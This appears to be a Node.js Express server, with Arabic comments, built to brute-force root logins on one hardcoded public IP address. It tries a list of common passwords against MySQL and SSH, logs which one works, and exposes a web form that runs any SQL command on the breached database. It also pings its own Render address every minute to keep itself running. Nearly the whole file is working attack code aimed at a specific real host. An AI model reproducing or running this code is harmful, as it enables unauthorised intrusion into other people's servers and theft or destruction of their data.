const express = require('express');
const mysql = require('mysql2/promise');
const { Client } = require('ssh2');
const app = express();
const port = process.env.PORT || 10000;

let logs = [];
let connectedService = null;
let connectionResult = null;

// كلمات المرور الشائعة للتجريب
const passwords = ['root', 'admin', '123456', '', 'toor', 'password'];

const targetIP = '185.182.193.132';

// Ping للحفاظ على تشغيل السيرفر في Render
setInterval(() => {
  fetch(`https://noon-9v11.onrender.com/`).catch(() => {});
}, 60_000);

// تجربة MySQL
async function tryMySQL() {
  for (const pass of passwords) {
    try {
      const conn = await mysql.createConnection({
        host: targetIP,
        port: 3306,
        user: 'root',
        password: pass,
      });
      const [rows] = await conn.execute('SHOW DATABASES;');
      connectionResult = rows;
      connectedService = 'MySQL';
      logs.push(`✅ MySQL Connected with password: "${pass}"`);
      return;
    } catch (e) {
      logs.push(`❌ MySQL Failed: ${pass}`);
    }
  }
}

// تجربة SSH
async function trySSH() {
  return new Promise((resolve) => {
    let index = 0;
    const tryNext = () => {
      if (index >= passwords.length) return resolve();
      const conn = new Client();
      const password = passwords[index++];
      conn
        .on('ready', () => {
          connectedService = 'SSH';
          logs.push(`✅ SSH Connected with password: "${password}"`);
          connectionResult = 'You can now run commands via /cmd';
          conn.end();
          resolve();
        })
        .on('error', () => {
          logs.push(`❌ SSH Failed: ${password}`);
          tryNext();
        })
        .connect({
          host: targetIP,
          port: 22,
          username: 'root',
          password,
          readyTimeout: 5000,
        });
    };
    tryNext();
  });
}

// واجهة عرض النتائج
app.get('/', (req, res) => {
  res.send(`
    <html style="background:#000;color:#0f0;padding:20px;font-family:monospace">
      <h2>🔍 فحص SSH / MySQL على ${targetIP}</h2>
      <p>⏳ الخدمة المتصلة: ${connectedService || 'لا يوجد اتصال بعد'}</p>
      <p>📦 النتائج:</p>
      <pre>${JSON.stringify(connectionResult, null, 2)}</pre>
      <h3>📜 السجل:</h3>
      <pre>${logs.slice(-20).join('\n')}</pre>
      <form method="GET" action="/cmd">
        <input name="q" placeholder="اكتب أمر SSH أو SQL" style="width:100%;padding:5px">
        <button type="submit">تشغيل</button>
      </form>
    </html>
  `);
});

// تنفيذ أوامر MySQL أو SSH (تجريبي)
app.get('/cmd', async (req, res) => {
  const cmd = req.query.q || '';
  if (!connectedService) return res.send('❌ لم يتم الاتصال بأي خدمة بعد');

  if (connectedService === 'MySQL') {
    try {
      const conn = await mysql.createConnection({
        host: targetIP,
        port: 3306,
        user: 'root',
        password: passwords.find(p => logs.includes(`✅ MySQL Connected with password: "${p}"`)),
      });
      const [rows] = await conn.execute(cmd);
      return res.send(`<pre>${JSON.stringify(rows, null, 2)}</pre><a href="/">رجوع</a>`);
    } catch (e) {
      return res.send('❌ خطأ في تنفيذ الأمر');
    }
  }

  // يمكن تطويره لاحقًا لأوامر SSH
  res.send('🔒 SSH أوامر لم تُفعل بعد - استخدم MySQL فقط الآن');
});

app.listen(port, () => {
  logs.push(`🚀 Running on port ${port}`);
  tryMySQL().then(() => trySSH());
});
